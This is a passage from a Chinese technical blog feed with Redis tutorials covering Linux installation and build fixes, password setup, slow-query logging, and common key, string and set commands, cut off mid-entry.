      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redis%20Linux%20%E5%AE%89%E8%A3%85%E8%BF%90%E8%A1%8C%E5%AE%9E%E6%88%98%E5%85%A8%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redis%20Linux%20%E5%AE%89%E8%A3%85%E8%BF%90%E8%A1%8C%E5%AE%9E%E6%88%98%E5%85%A8%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h4 id="下载Redis"><a href="#下载Redis" class="headerlink" title="下载Redis"></a>下载Redis</h4><p>去Redis官网下载最新的Linux包，Redis官方没有Windows版的下载。</p><blockquote><p><a href="https://redis.io/">https://redis.io/</a></p></blockquote><p>下载后把包上传到Linux服务器。</p><h4 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h4><p>1、解压Redis包</p><pre class="line-numbers language-none"><code class="language-none">&gt; tar -zxvf redis-4.0.2.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、切换到Redis解压目录</p><pre class="line-numbers language-none"><code class="language-none">&gt; cd redis-4.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、编译Redis</p><pre class="line-numbers language-none"><code class="language-none">&gt; make<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如报错按以下错误解决。</p><blockquote><p>make: cc：命令未找到</p><p>make: *** [adlist.o] 错误 127</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&gt; yum install gcc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>collect2: ld returned 1 exit status</p><p>make[1]: *** [redis-server] Error 1</p><p>make[1]: Leaving directory &#96;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;src’</p><p>make: *** [all] Error 2</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&gt; vi src&#x2F;.make-settings，修改OPT&#x3D;-O2 -march&#x3D;x86-64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4、编译测试</p><pre class="line-numbers language-none"><code class="language-none">&gt; make test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>报错解决。</p><blockquote><p>make[1]: Entering directory <code>/home/test/redis-4.0.2/src&#39;     CC Makefile.dep make[1]: Leaving directory </code>&#x2F;home&#x2F;test&#x2F;redis-4.0.2&#x2F;src’<br>make[1]: Entering directory <code>/home/test/redis-4.0.2/src&#39; You need tcl 8.5 or newer in order to run the Redis test make[1]: *** [test] Error 1 make[1]: Leaving directory </code>&#x2F;home&#x2F;test&#x2F;redis-4.0.2&#x2F;src’</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&gt; wget http:&#x2F;&#x2F;downloads.sourceforge.net&#x2F;tcl&#x2F;tcl8.6.7-src.tar.gz&gt; tar -zxvf tcl8.6.7-src.tar.gz&gt; cd tcl8.6.7&#x2F;unix&#x2F;&gt; .&#x2F;configure&gt; make&gt; make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、安装</p><p>切换到redis目录执行安装。</p><pre class="line-numbers language-none"><code class="language-none">&gt; make install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="启动Redis"><a href="#启动Redis" class="headerlink" title="启动Redis"></a>启动Redis</h4><p>启动redis src目录下的redis-server命令来启动Redis服务。</p><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;redis-server ..&#x2F;redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动成功画面：</p><pre class="line-numbers language-none"><code class="language-none">6651:C 17 Nov 09:24:43.145 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo6651:C 17 Nov 09:24:43.145 # Redis version&#x3D;4.0.2, bits&#x3D;64, commit&#x3D;00000000, modified&#x3D;0, pid&#x3D;6651, just started6651:C 17 Nov 09:24:43.145 # Configuration loaded6651:M 17 Nov 09:24:43.147 # You requested maxclients of 10000 requiring at least 10032 max file descriptors.6651:M 17 Nov 09:24:43.147 # Server can&#39;t set maximum open files to 10032 because of OS error: Operation not permitted.6651:M 17 Nov 09:24:43.147 # Current maximum open files is 4096. maxclients has been reduced to 4064 to compensate for low ulimit. If you need higher maxclients increase &#39;ulimit -n&#39;.                _._                                                             _.-&#96;&#96;__ &#39;&#39;-._                                                   _.-&#96;&#96;    &#96;.  &#96;_.  &#39;&#39;-._           Redis 4.0.2 (00000000&#x2F;0) 64 bit  .-&#96;&#96; .-&#96;&#96;&#96;.  &#96;&#96;&#96;\&#x2F;    _.,_ &#39;&#39;-._                                    (    &#39;      ,       .-&#96;  | &#96;,    )     Running in standalone mode |&#96;-._&#96;-...-&#96; __...-.&#96;&#96;-._|&#39;&#96; _.-&#39;|     Port: 6379 |    &#96;-._   &#96;._    &#x2F;     _.-&#39;    |     PID: 6651  &#96;-._    &#96;-._  &#96;-.&#x2F;  _.-&#39;    _.-&#39;                                    |&#96;-._&#96;-._    &#96;-.__.-&#39;    _.-&#39;_.-&#39;|                                   |    &#96;-._&#96;-._        _.-&#39;_.-&#39;    |           http:&#x2F;&#x2F;redis.io          &#96;-._    &#96;-._&#96;-.__.-&#39;_.-&#39;    _.-&#39;                                    |&#96;-._&#96;-._    &#96;-.__.-&#39;    _.-&#39;_.-&#39;|                                   |    &#96;-._&#96;-._        _.-&#39;_.-&#39;    |                                    &#96;-._    &#96;-._&#96;-.__.-&#39;_.-&#39;    _.-&#39;                                         &#96;-._    &#96;-.__.-&#39;    _.-&#39;                                                 &#96;-._        _.-&#39;                                                         &#96;-.__.-&#39;                                               6651:M 17 Nov 09:24:43.157 # WARNING: The TCP backlog setting of 511 cannot be enforced because &#x2F;proc&#x2F;sys&#x2F;net&#x2F;core&#x2F;somaxconn is set to the lower value of 128.6651:M 17 Nov 09:24:43.158 # Server initialized6651:M 17 Nov 09:24:43.158 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add &#39;vm.overcommit_memory &#x3D; 1&#39; to &#x2F;etc&#x2F;sysctl.conf and then reboot or run the command &#39;sysctl vm.overcommit_memory&#x3D;1&#39; for this to take effect.6651:M 17 Nov 09:24:43.158 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command &#39;echo never &gt; &#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;enabled&#39; as root, and add it to your &#x2F;etc&#x2F;rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.6651:M 17 Nov 09:24:43.158 * Ready to accept connections<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="连接Redis"><a href="#连接Redis" class="headerlink" title="连接Redis"></a>连接Redis</h2><p>启动redis src目录下的redis-cli命令来连接到Redis服务。</p><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;redis-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接成功：</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另外推荐使用客户端连接工具：redis desktop manager。</p><blockquote><p><a href="https://redisdesktop.com/download">https://redisdesktop.com/download</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 再牛逼，也得设置密码</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redis%20%E5%86%8D%E7%89%9B%E9%80%BC%EF%BC%8C%E4%B9%9F%E5%BE%97%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81%EF%BC%81%EF%BC%81/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redis%20%E5%86%8D%E7%89%9B%E9%80%BC%EF%BC%8C%E4%B9%9F%E5%BE%97%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81%EF%BC%81%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Redis 你再牛逼也得设置密码啊，不然会有安全漏洞，造成一些隐患。</p><p>还有，比如像出现下面这样的错，需要设置密码，或者关闭保护模式，所以还是设置密码比较安全。不然只能本地操作，不能远程连接。</p><pre class="line-numbers language-none"><code class="language-none">DENIED Redis is running in protected mode because protected mode is enabled…<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面介绍几种设置密码的方式，及如何使用。</p><h6 id="命令设置密码"><a href="#命令设置密码" class="headerlink" title="命令设置密码"></a>命令设置密码</h6><p>这种方式是临时的，重启后需要重新设置。</p><blockquote><p>config set requirepass 123456</p></blockquote><h6 id="配置设置密码"><a href="#配置设置密码" class="headerlink" title="配置设置密码"></a>配置设置密码</h6><p>redis.conf中添加配置：</p><pre class="line-numbers language-none"><code class="language-none">requirepass 123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="授权密码："><a href="#授权密码：" class="headerlink" title="授权密码："></a>授权密码：</h6><p>有两种方式：</p><blockquote><p>auth 123456</p></blockquote><blockquote><p>$ .&#x2F;redis-cli -p 9001 -a 123456</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 如何分析慢查询操作？</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redis%20%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C%EF%BC%9F/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redis%20%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是慢查询"><a href="#什么是慢查询" class="headerlink" title="什么是慢查询"></a>什么是慢查询</h4><p>和mysql的慢SQL日志分析一样，redis也有类似的功能，来帮助定位一些慢查询操作。</p><p>Redis <strong>slowlog</strong>是Redis用来记录查询执行时间的日志系统。</p><p>查询执行时间指的是不包括像客户端响应(talking)、发送回复等IO操作，而单单是执行一个查询命令所耗费的时间。</p><p>另外，slow log保存在内存里面，读写速度非常快，因此你可以放心地使用它，不必担心因为开启slow log而损害Redis的速度。</p><h4 id="慢查询参数"><a href="#慢查询参数" class="headerlink" title="慢查询参数"></a>慢查询参数</h4><p>首先来关注下慢日志分析对应的两个参数：</p><p>1、<strong>slowlog-log-slower-than</strong>：预设阀值，即记录超过多少时间的记录，默认为10000微秒，即10毫秒。</p><p>2、<strong>slowlog-max-len</strong>：记录慢查询的条数，默认为128条，当超过设置的条数时最早进入队列的将被移除。线上建议增大数值，如：1000，这样可减少队列移除的频率。</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; config get slowlog-log-slower-than1) &quot;slowlog-log-slower-than&quot;2) &quot;10000&quot;127.0.0.1:6379&gt; config get slowlog-max-len1) &quot;slowlog-max-len&quot;2) &quot;128&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以用config set对这两个参数进行调整，或者在配置文件中设置。</p><pre class="line-numbers language-none"><code class="language-none">################################## SLOW LOG #################################### The Redis Slow Log is a system to log queries that exceeded a specified# execution time. The execution time does not include the I&#x2F;O operations# like talking with the client, sending the reply and so forth,# but just the time needed to actually execute the command (this is the only# stage of command execution where the thread is blocked and can not serve# other requests in the meantime).## You can configure the slow log with two parameters: one tells Redis# what is the execution time, in microseconds, to exceed in order for the# command to get logged, and the other parameter is the length of the# slow log. When a new command is logged the oldest one is removed from the# queue of logged commands.# The following time is expressed in microseconds, so 1000000 is equivalent# to one second. Note that a negative number disables the slow log, while# a value of zero forces the logging of every command.slowlog-log-slower-than 10000# There is no limit to this length. Just be aware that it will consume memory.# You can reclaim memory used by the slow log with SLOWLOG RESET.slowlog-max-len 128<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="慢查询命令"><a href="#慢查询命令" class="headerlink" title="慢查询命令"></a>慢查询命令</h4><blockquote><p>语法：slowlog subcommand [argument]</p></blockquote><p>如，进行查询慢查询、获取慢查询记录的数量、重置慢查询日志等操作：</p><pre class="line-numbers language-none"><code class="language-none">192.168.10.38:9001&gt; slowlog get(empty list or set)192.168.10.38:9001&gt; slowlog get 10(empty list or set)192.168.10.38:9001&gt; slowlog len (integer) 0192.168.10.38:9001&gt; slowlog resetOK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 常用操作命令，非常详细！</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redis%20%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%EF%BC%8C%E9%9D%9E%E5%B8%B8%E8%AF%A6%E7%BB%86%EF%BC%81/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/Redis%20%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%EF%BC%8C%E9%9D%9E%E5%B8%B8%E8%AF%A6%E7%BB%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>下面总结并演示了 Redis 的 常用管理命令、key 操作、字符串、集合、列表、散列类型的操作命令。</p><h2 id="你需要掌握的-Redis-知识"><a href="#你需要掌握的-Redis-知识" class="headerlink" title="你需要掌握的 Redis 知识"></a>你需要掌握的 Redis 知识</h2><ul><li><a href="https://mp.weixin.qq.com/s/VjjEFyVOo2krICWBV3kEsg">史上最全 Redis 高可用解决方案总结</a></li><li><a href="https://mp.weixin.qq.com/s/mmDo7_ogqxtoxwfKpe9cYg">为什么分布式一定要有Redis?</a></li><li><a href="https://mp.weixin.qq.com/s/K0q8brB1ZAFz_bU50yu4NA">Spring Boot Redis Cluster 实战干货</a></li><li><a href="https://mp.weixin.qq.com/s/dFnP3URKidfwwFU5gCYAHw">Spring Data Redis 详解及实战</a></li><li><a href="https://mp.weixin.qq.com/s/MzkvQG2mFyvTNegFX52ztg">一个 Redis 命令，导致公司损失 400 万！</a></li></ul><p>更多请在后台回复关键字：Redis。</p><h2 id="常用管理命令"><a href="#常用管理命令" class="headerlink" title="常用管理命令"></a>常用管理命令</h2><h4 id="1、启动Redis"><a href="#1、启动Redis" class="headerlink" title="1、启动Redis"></a>1、启动Redis</h4><pre class="line-numbers language-none"><code class="language-none">&gt; redis-server [--port 6379]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果命令参数过多，建议通过配置文件来启动Redis。</p><pre class="line-numbers language-none"><code class="language-none">&gt; redis-server [xx&#x2F;xx&#x2F;redis.conf]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6379是Redis默认端口号。</p><h4 id="2、连接Redis"><a href="#2、连接Redis" class="headerlink" title="2、连接Redis"></a>2、连接Redis</h4><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;redis-cli [-h 127.0.0.1 -p 6379]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3、停止Redis"><a href="#3、停止Redis" class="headerlink" title="3、停止Redis"></a>3、停止Redis</h4><pre class="line-numbers language-none"><code class="language-none">&gt; redis-cli shutdown&gt; kill redis-pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以上两条停止Redis命令效果一样。</p><h4 id="4、发送命令"><a href="#4、发送命令" class="headerlink" title="4、发送命令"></a>4、发送命令</h4><p>给Redis发送命令有两种方式：</p><p>1、redis-cli带参数运行，如：</p><pre class="line-numbers language-none"><code class="language-none">&gt; redis-cli shutdownnot connected&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样默认是发送到本地的6379端口。</p><p>2、redis-cli不带参数运行，如：</p><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;redis-cli127.0.0.1:6379&gt; shutdownnot connected&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5、测试连通性"><a href="#5、测试连通性" class="headerlink" title="5、测试连通性"></a>5、测试连通性</h4><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; pingPONG<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="key操作命令"><a href="#key操作命令" class="headerlink" title="key操作命令"></a>key操作命令</h2><h4 id="获取所有键"><a href="#获取所有键" class="headerlink" title="获取所有键"></a>获取所有键</h4><blockquote><p>语法：keys pattern</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; keys *1) &quot;javastack&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>*表示通配符，表示任意字符，会遍历所有键显示所有的键列表，时间复杂度O(n)，在生产环境不建议使用。</li></ul><h4 id="获取键总数"><a href="#获取键总数" class="headerlink" title="获取键总数"></a>获取键总数</h4><blockquote><p>语法：dbsize</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; dbsize(integer) 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获取键总数时不会遍历所有的键，直接获取内部变量，时间复杂度O(1)。</p><h4 id="查询键是否存在"><a href="#查询键是否存在" class="headerlink" title="查询键是否存在"></a>查询键是否存在</h4><blockquote><p>语法：exists key [key …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; exists javastack java(integer) 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查询查询多个，返回存在的个数。</p><h4 id="删除键"><a href="#删除键" class="headerlink" title="删除键"></a>删除键</h4><blockquote><p>语法：del key [key …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; del java javastack(integer) 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以删除多个，返回删除成功的个数。</p><h4 id="查询键类型"><a href="#查询键类型" class="headerlink" title="查询键类型"></a>查询键类型</h4><blockquote><p>语法： type key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; type javastackstring<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="移动键"><a href="#移动键" class="headerlink" title="移动键"></a>移动键</h4><blockquote><p>语法：move key db</p></blockquote><p>如把javastack移到2号数据库。</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; move javastack 2(integer) 1127.0.0.1:6379&gt; select 2OK127.0.0.1:6379[2]&gt; keys *1) &quot;javastack&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="查询key的生命周期（秒）"><a href="#查询key的生命周期（秒）" class="headerlink" title="查询key的生命周期（秒）"></a>查询key的生命周期（秒）</h4><blockquote><p>秒语法：ttl key</p></blockquote><blockquote><p>毫秒语法：pttl key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379[2]&gt; ttl javastack(integer) -1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>-1：永远不过期。</p><h4 id="设置过期时间"><a href="#设置过期时间" class="headerlink" title="设置过期时间"></a>设置过期时间</h4><blockquote><p>秒语法：expire key seconds</p></blockquote><blockquote><p>毫秒语法：pexpire key milliseconds</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379[2]&gt; expire javastack 60(integer) 1127.0.0.1:6379[2]&gt; ttl javastack(integer) 55<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置永不过期"><a href="#设置永不过期" class="headerlink" title="设置永不过期"></a>设置永不过期</h4><blockquote><p>语法：persist key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379[2]&gt; persist javastack(integer) 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="更改键名称"><a href="#更改键名称" class="headerlink" title="更改键名称"></a>更改键名称</h4><blockquote><p>语法：rename key newkey</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379[2]&gt; rename javastack javastack123OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="字符串操作命令"><a href="#字符串操作命令" class="headerlink" title="字符串操作命令"></a>字符串操作命令</h2><p>字符串是Redis中最基本的数据类型，单个数据能存储的最大空间是512M。</p><h4 id="存放键值"><a href="#存放键值" class="headerlink" title="存放键值"></a>存放键值</h4><blockquote><p>语法：set key value [EX seconds] [PX milliseconds] [NX|XX]</p></blockquote><p>nx：如果key不存在则建立，xx：如果key存在则修改其值，也可以直接使用setnx&#x2F;setex命令。</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; set javastack 666OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="获取键值"><a href="#获取键值" class="headerlink" title="获取键值"></a>获取键值</h4><blockquote><p>语法：get key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379[2]&gt; get javastack&quot;666&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="值递增-递减"><a href="#值递增-递减" class="headerlink" title="值递增&#x2F;递减"></a>值递增&#x2F;递减</h4><p>如果字符串中的值是数字类型的，可以使用incr命令每次递增，不是数字类型则报错。</p><blockquote><p>语法：incr key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379[2]&gt; incr javastack(integer) 667<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>一次想递增N用incrby命令，如果是浮点型数据可以用incrbyfloat命令递增。</p><p>同样，递减使用decr、decrby命令。</p><h4 id="批量存放键值"><a href="#批量存放键值" class="headerlink" title="批量存放键值"></a>批量存放键值</h4><blockquote><p>语法：mset key value [key value …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379[2]&gt; mset java1 1 java2 2 java3 3OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="获取获取键值"><a href="#获取获取键值" class="headerlink" title="获取获取键值"></a>获取获取键值</h4><blockquote><p>语法：mget key [key …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379[2]&gt; mget java1 java21) &quot;1&quot;2) &quot;2&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Redis接收的是UTF-8的编码，如果是中文一个汉字将占3位返回。</p><h4 id="获取值长度"><a href="#获取值长度" class="headerlink" title="获取值长度"></a>获取值长度</h4><blockquote><p>语法：strlen key</p></blockquote><blockquote><p>127.0.0.1:6379[2]&gt; strlen javastack<br>(integer) 3</p></blockquote><h4 id="追加内容"><a href="#追加内容" class="headerlink" title="追加内容"></a>追加内容</h4><blockquote><p>语法：append key value</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379[2]&gt; append javastack hi(integer) 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>向键值尾部添加，如上命令执行后由666变成666hi</p><h4 id="获取部分字符"><a href="#获取部分字符" class="headerlink" title="获取部分字符"></a>获取部分字符</h4><blockquote><p>语法：getrange key start end</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&gt; 127.0.0.1:6379[2]&gt; getrange javastack 0 4&quot;javas&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="集合操作命令"><a href="#集合操作命令" class="headerlink" title="集合操作命令"></a>集合操作命令</h2><p>集合类型和列表类型相似，只不过是集合是无序且不可重复的。</p><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><h4 id="存储值"><a href="#存储值" class="headerlink" title="存储值"></a>存储值</h4><blockquote><p>语法：sadd key member [member …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 这里有8个值（2个java），只存了7个127.0.0.1:6379&gt; sadd langs java php c++ go ruby python kotlin java(integer) 7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="获取元素"><a href="#获取元素" class="headerlink" title="获取元素"></a>获取元素</h4><blockquote><p>获取所有元素语法：smembers key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; smembers langs1) &quot;php&quot;2) &quot;kotlin&quot;3) &quot;c++&quot;4) &quot;go&quot;5) &quot;ruby&quot;6) &quot;python&quot;7) &quot;java&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>随机获取语法：srandmember langs count</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; srandmember langs 31) &quot;c++&quot;2) &quot;java&quot;3) &quot;php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="判断集合是否存在元素"><a href="#判断集合是否存在元素" class="headerlink" title="判断集合是否存在元素"></a>判断集合是否存在元素</h4><blockquote><p>语法：sismember key member</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; sismember langs go(integer) 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="获取集合元素个数"><a href="#获取集合元素个数" class="headerlink" title="获取集合元素个数"></a>获取集合元素个数</h4><blockquote><p>语法：scard key</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; scard langs(integer) 7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="删除集合元素"><a href="#删除集合元素" class="headerlink" title="删除集合元素"></a>删除集合元素</h4><blockquote><p>语法：srem key member [member …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; srem langs ruby kotlin(integer) 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="弹出元素"><a href="#弹出元素" class="headerlink" title="弹出元素"></a>弹出元素</h4><blockquote><p>语法：spop key [count]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; spop langs 21) &quot;go&quot;2) &quot;java&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="有序集合"><a href="#有序集合" class="headerlink" title="有序集合"></a>有序集合</h2><p>和列表的区别：</p><p>1、列表使用链表实现，两头快，中间慢。有序集合是散列表和跳跃表实现的，即使读取中间的元素也比较快。</p><p>2、列表不能调整元素位置，有序集合能。</p><p>3、有序集合比列表更占内存。</p><h4 id="存储值-1"><a href="#存储值-1" class="headerlink" title="存储值"></a>存储值</h4><blockquote><p>语法：zadd key [NX|XX] [CH] [INCR] score member [score member …]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; zadd footCounts 16011 tid 20082 huny 2893 nosy(integer) 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="获取元素分数"><a href="#获取元素分数" class="headerlink" title="获取元素分数"></a>获取元素分数</h4><blockquote><p>语法：zscore key member</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; zscore footCounts tid&quot;16011&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>获取排名范围排名语法：zrange key start stop [WITHSCORES]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 获取所有，没有分数127.0.0.1:6379&gt; zrange footCounts 0 -11) &quot;nosy&quot;2) &quot;tid&quot;3) &quot;huny&quot;&#x2F;&#x2F; 获取所有及分数127.0.0.1:6379&gt; zrange footCounts 0 -1 Withscores1) &quot;nosy&quot;2) &quot;2893&quot;3) &quot;tid&quot;4) &quot;16011&quot;5) &quot;huny&quot;6) &quot;20082&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>获取指定分数范围排名语法：zrangebyscore key min max [WITHSCORES] [LIMIT offset count]</p></blockquote><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; zrangebyscore footCounts 3000 30000 withscores limit 0 11) &quot;tid&quot;2) &quot;16011&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="增加指定元素分数"><a href="#增加指定元素分数" class="headerlink" title="增加指定元素分数"></a>增加指定元素分数</h4><blockquote><p>语法：zincrby key increment member</p></blockquote><pre class="line-numbers language-none"><code 